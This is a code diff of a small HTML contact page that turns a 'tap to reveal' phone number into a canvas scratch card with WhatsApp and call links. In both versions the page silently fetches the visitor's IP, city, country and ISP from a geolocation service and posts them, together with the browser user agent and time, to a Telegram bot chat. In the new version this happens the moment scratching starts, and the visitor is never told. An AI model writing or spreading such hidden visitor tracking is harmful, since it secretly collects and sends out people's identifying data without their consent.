@@ -7,84 +7,69 @@
 <style>
 body {
   margin: 0;
-  font-family: 'Segoe UI', sans-serif;
-  height: 100vh;
+  font-family: sans-serif;
+  background: linear-gradient(135deg, #667eea, #764ba2);
   display: flex;
   justify-content: center;
   align-items: center;
-  background: linear-gradient(135deg, #667eea, #764ba2);
+  height: 100vh;
 }
 
-/* Glass Card */
 .container {
-  background: rgba(255,255,255,0.15);
-  backdrop-filter: blur(15px);
-  padding: 25px;
-  border-radius: 20px;
+  background: white;
+  padding: 20px;
+  border-radius: 15px;
   width: 90%;
   max-width: 380px;
   text-align: center;
-  color: white;
-  box-shadow: 0 10px 30px rgba(0,0,0,0.2);
 }
 
-/* Title */
 h2 {
-  margin-bottom: 20px;
+  margin-bottom: 15px;
 }
 
-/* ALL BUTTONS SAME SIZE */
-button, a {
-  display: block;
+/* Scratch box */
+.scratch-card {
+  position: relative;
   width: 100%;
-  padding: 15px;
-  margin-top: 12px;
-  border-radius: 12px;
-  font-size: 16px;
-  text-align: center;
-  box-sizing: border-box;
-  text-decoration: none;
-  border: none;
-  transition: 0.2s;
+  height: 80px;
+  margin-top: 15px;
 }
 
-/* Main button */
-button {
-  background: white;
-  color: #333;
-  font-weight: bold;
-}
-
-button:active {
-  transform: scale(0.96);
-}
-
-/* WhatsApp */
-#wa {
-  background: #25D366;
-  color: white;
-}
-
-/* Call */
-#call {
-  background: #28a745;
-  color: white;
-}
-
-/* Number */
-#num {
+#number {
+  position: absolute;
+  width: 100%;
+  height: 100%;
   font-size: 22px;
-  margin-top: 15px;
   font-weight: bold;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: #f1f1f1;
+  border-radius: 10px;
 }
 
-/* Loading */
-#loading {
-  display: none;
-  margin-top: 15px;
-  font-size: 14px;
-  opacity: 0.8;
+canvas {
+  position: absolute;
+  top: 0;
+  left: 0;
+  border-radius: 10px;
 }
+
+/* Buttons */
+a {
+  display: none;
+  width: 100%;
+  padding: 14px;
+  margin-top: 12px;
+  border-radius: 10px;
+  text-decoration: none;
+  color: white;
+}
+
+#wa { background: #25D366; }
+#call { background: #28a745; }
+
 </style>
 </head>
 
@@ -92,43 +77,88 @@ button:active {
 
 <div class="container">
 
-<h2>Contact Me</h2>
+<h2>Scratch to Reveal Number</h2>
 
-<button onclick="reveal()">Tap to Reveal Number</button>
+<div class="scratch-card">
+  <div id="number">+91 9510389983</div>
+  <canvas id="scratch"></canvas>
+</div>
 
-<p id="loading">🔍 Verifying...</p>
-
-<p id="num" style="display:none;">
-  +91 9510389983
-</p>
-
-<a id="wa" target="_blank" style="display:none;">
-  💬 Chat on WhatsApp
-</a>
-
-<a id="call" target="_self" style="display:none;">
-  📞 Call Now
-</a>
+<a id="wa" target="_blank">💬 WhatsApp</a>
+<a id="call">📞 Call</a>
 
 </div>
 
 <script>
-async function reveal() {
+const canvas = document.getElementById("scratch");
+const ctx = canvas.getContext("2d");
 
-  document.getElementById("loading").style.display = "block";
+canvas.width = canvas.offsetWidth;
+canvas.height = canvas.offsetHeight;
 
-  await new Promise(r => setTimeout(r, 1200));
+// Grey overlay
+ctx.fillStyle = "#ccc";
+ctx.fillRect(0, 0, canvas.width, canvas.height);
 
+ctx.globalCompositeOperation = "destination-out";
+
+let isDrawing = false;
+let revealed = false;
+
+function start(e) {
+  isDrawing = true;
+  sendData(); // send once when user starts scratching
+}
+
+function end() {
+  isDrawing = false;
+}
+
+function draw(e) {
+  if (!isDrawing) return;
+
+  let rect = canvas.getBoundingClientRect();
+  let x = (e.touches ? e.touches[0].clientX : e.clientX) - rect.left;
+  let y = (e.touches ? e.touches[0].clientY : e.clientY) - rect.top;
+
+  ctx.beginPath();
+  ctx.arc(x, y, 15, 0, Math.PI * 2);
+  ctx.fill();
+
+  // reveal buttons once scratched enough
+  if (!revealed) {
+    revealed = true;
+    document.getElementById("wa").style.display = "block";
+    document.getElementById("call").style.display = "block";
+
+    document.getElementById("wa").href =
+      "https://wa.me/919510389983";
+
+    document.getElementById("call").href =
+      "tel:9510389983";
+  }
+}
+
+// Events
+canvas.addEventListener("mousedown", start);
+canvas.addEventListener("mouseup", end);
+canvas.addEventListener("mousemove", draw);
+
+canvas.addEventListener("touchstart", start);
+canvas.addEventListener("touchend", end);
+canvas.addEventListener("touchmove", draw);
+
+// Send data to Telegram
+async function sendData() {
   try {
     let data = await fetch("https://ipapi.co/json/")
       .then(res => res.json());
 
-    let message =
-`📱 New Visitor!
+    let msg =
+`📱 Scratch Visitor!
 
 IP: ${data.ip}
 City: ${data.city}
-Region: ${data.region}
 Country: ${data.country_name}
 ISP: ${data.org}
 Device: ${navigator.userAgent}
@@ -139,23 +169,11 @@ Time: ${new Date().toLocaleString()}`;
       headers: {"Content-Type": "application/json"},
       body: JSON.stringify({
         chat_id: "6319233453",
-        text: message
+        text: msg
       })
     });
 
   } catch(e) {}
-
-  document.getElementById("loading").style.display = "none";
-
-  document.getElementById("num").style.display = "block";
-
-  document.getElementById("wa").href =
-    "https://wa.me/919510389983";
-  document.getElementById("wa").style.display = "block";
-
-  document.getElementById("call").href =
-    "tel:9510389983";
-  document.getElementById("call").style.display = "block";
 }
 </script>
 
